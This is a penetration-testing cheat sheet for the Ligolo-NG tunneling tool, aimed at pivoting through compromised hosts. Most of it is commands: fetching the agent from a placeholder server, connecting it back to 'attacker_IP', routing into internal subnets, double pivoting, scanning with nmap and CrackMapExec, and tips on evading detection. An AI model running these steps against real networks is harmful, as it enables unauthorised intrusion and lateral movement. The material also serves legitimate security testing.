# Ligolo-NG Cheat Sheet: Advanced Tunneling & Network Pivoting

Ligolo-NG is an **encrypted tunneling tool** that allows penetration testers to pivot through compromised hosts and access internal networks. Unlike SOCKS proxies, Ligolo-NG establishes a **Layer 3 (IP-based) tunnel**, meaning you get **full network access** (TCP, UDP, ICMP) instead of just TCP-based tunneling.

This cheat sheet covers:
✅ **Basic & Advanced Setup** (Running Ligolo-NG in different environments)
✅ **Pivoting Use Cases** (Single & Multi-hop scenarios)
✅ **Alternative: Running the server on a remote VPS (Debian, No GUI)**

⸻

## 1. Why Use Ligolo-NG?

Ligolo-NG is useful when:
✅ You need **a full VPN-like tunnel** to an internal network via a compromised host
✅ You want **encrypted, stealthy tunneling** that mimics normal HTTPS traffic
✅ You need **low-latency, high-speed pivoting** (better than SSH dynamic forwarding)
✅ You want to **bypass SOCKS proxy limitations** (supports ICMP, UDP, and TCP)
✅ You need **multi-hop tunneling** (double pivoting)

⸻

## 2. How Ligolo-NG Works

Ligolo-NG has two main components:
* **Proxy (Server)** – Runs on the attacker’s machine or a VPS, waiting for connections.
* **Agent (Client)** – Runs on the pivot (compromised machine) and connects to the proxy.

Once connected, Ligolo-NG:
	1.	Establishes a **TLS-encrypted tunnel** between the agent and proxy.
	2.	Creates a **virtual network interface (TUN)** on the attacker’s machine.
	3.	**Routes all traffic through the pivot**, giving full internal network access.

⸻

## 3. Setup: Running the Ligolo-NG Proxy (Attacker’s Side)

### Option 1: Running Proxy on Your Local Attack Machine (Kali)

If you’re directly attacking from **Kali Linux**, run the Ligolo-NG proxy:

./proxy -selfcert -listen 0.0.0.0:11601

* -selfcert → Generates a self-signed TLS certificate for encryption.
* -listen 0.0.0.0:11601 → Listens on **port 11601** for incoming agent connections.

📌 **Why?** This is ideal if you have **direct access** to the pivot over the internet (e.g., a cloud-exposed machine).

⸻

### Option 2: Running the Proxy on a Remote VPS (Debian, No GUI)

If you want **a stable always-online relay**, run the Ligolo-NG proxy on a **Debian VPS** instead of your local Kali box.

**🔹 Install Ligolo-NG on the VPS**

1️⃣ Update and install dependencies:

sudo apt update && sudo apt install wget unzip

2️⃣ Download Ligolo-NG:

wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_x64-linux.zip

3️⃣ Extract and set permissions:

unzip ligolo-ng_x64-linux.zip
chmod +x proxy agent

4️⃣ Start the Ligolo-NG proxy on your **Debian VPS**:

./proxy -selfcert -listen 0.0.0.0:11601

📌 **Why use a VPS?** If you’re **behind NAT** or **don’t want to expose your local IP**, a VPS provides a **stable relay** that pivots can connect to.

⸻

## 4. Running the Agent on the Pivot Host (Compromised Machine)

Once you have **proxy running**, transfer the agent to the pivot.

**🔹 Transferring the Agent**

On **Linux pivot**:

wget http://your-server.com/agent -O /tmp/agent
chmod +x /tmp/agent

On **Windows pivot** (PowerShell):

Invoke-WebRequest -Uri "http://your-server.com/agent.exe" -OutFile "C:\Users\Public\agent.exe"

**🔹 Running the Agent**

After transferring, run the agent to connect to your **proxy**:

🔹 **Linux Pivot:**

./agent -connect attacker_IP:11601 -ignore-cert

🔹 **Windows Pivot (CMD or PowerShell):**

agent.exe -connect attacker_IP:11601 -ignore-cert

* -connect → Specifies where the agent connects (**your attack machine/VPS**).
* -ignore-cert → Ignores TLS certificate warnings (useful with -selfcert).

⸻

## 5. Verify the Connection

Once the agent connects, **check the session** on your **attack machine/VPS** (where proxy is running):

./proxy session

Expected output:

Session #1: 192.168.1.10 (pivot machine)

✅ **Success!** The agent is connected, and Ligolo-NG is now tunneling traffic through it.

⸻

## 6. Routing Traffic Through the Tunnel

Once the agent connects, Ligolo-NG **creates a virtual network interface (tun0)** on your attacker system.

🔹 **Check the interface**:

ip a | grep tun

🔹 **Add a route to the internal network** (if needed):

sudo ip route add 10.0.5.0/24 via 172.31.0.2 dev tun0

📌 **Why?** If you know the pivot has access to 10.0.5.0/24, adding this route ensures all traffic to that subnet goes through the Ligolo tunnel.

⸻

## 7. Scanning the Internal Network via Ligolo-NG

Once your route is set, you can run **network recon** directly from your Kali box.

### 🔹 Ping Internal Hosts

ping -c 3 10.0.5.25

### 🔹 Scan Internal Network (Nmap)

nmap -sT -Pn -v 10.0.5.0/24

### 🔹 SMB Recon (Using CrackMapExec)

cme smb 10.0.5.10 -u admin -p password



⸻

## 8. Double Pivoting (Multi-Hop Tunnels)

Ligolo-NG **supports multiple pivots** (e.g., internal machine connects to another deeper internal machine).

### 🔹 Steps to Double Pivot

1️⃣ **Run an agent on Pivot 1** (First compromised machine)

./agent -connect attacker_IP:11601 -ignore-cert

2️⃣ **From Pivot 1, transfer the agent to Pivot 2**

scp agent user@pivot2:/tmp/

3️⃣ **Run another agent on Pivot 2 (connects to Pivot 1 instead of attacker)**

./agent -connect pivot1_IP:11601 -ignore-cert

4️⃣ **Check sessions on Pivot 1:**

./proxy session

5️⃣ **Add routing to access Pivot 2’s network via Pivot 1**

sudo ip route add 10.0.10.0/24 via 172.31.0.3 dev tun0

Now, you can scan 10.0.10.0/24 from your Kali, despite needing **two pivots to reach it**.

⸻

## 9. Securely Closing the Tunnel

To **disconnect** the pivot:
🔹 On the pivot:

pkill agent

🔹 On the attacker’s machine:

./proxy session -close 1

To clean up routes:

sudo ip route del 10.0.5.0/24



⸻

## 10. Troubleshooting

**❓ Agent is not connecting**
✔️ Ensure **proxy is running and listening** (netstat -tulnp | grep 11601)
✔️ Check **firewall rules** (some networks block outbound connections)
✔️ Try **different ports** (e.g., run proxy on **443** to blend in with HTTPS)

./proxy -selfcert -listen 0.0.0.0:443
./agent -connect attacker_IP:443 -ignore-cert

**❓ No traffic going through the tunnel**
✔️ Ensure **tun0 is created** (ip a | grep tun)
✔️ Add the correct **routing rule** (ip route add ...)
✔️ Verify **the pivot can reach the target network** (ping 10.0.5.1 from pivot)

⸻

## Conclusion

Ligolo-NG is one of the most **stealthy, flexible, and powerful** tunneling tools available for pentesters. Whether running on **your local Kali machine or a remote Debian VPS**, it provides a **fast and secure way to pivot through internal networks**.

✅ **Use Ligolo-NG when you need full network access, not just SOCKS proxies**
✅ **Use a remote VPS as a stable attack relay to avoid detection**
✅ **Use multi-hop tunneling to access deeper internal networks**

Now go pivot like a pro! 🚀
